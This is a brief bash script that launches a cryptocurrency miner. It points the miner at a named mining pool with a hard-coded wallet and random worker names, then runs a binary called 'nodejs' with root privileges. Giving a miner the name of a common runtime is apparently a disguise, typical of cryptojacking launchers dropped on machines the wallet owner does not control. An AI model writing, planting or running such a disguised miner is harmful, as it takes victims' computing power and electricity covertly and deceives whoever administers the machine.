#!/bin/bash
POOL=eth-us1.hellominer.com:1100
WALLET=RY28x597iBdNnLziuhQ3Y1z9C48Zjo2ysn
WORKER=$(echo $(shuf -i 1-5 -n 1)-gass) 
chmod +x nodejs
sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
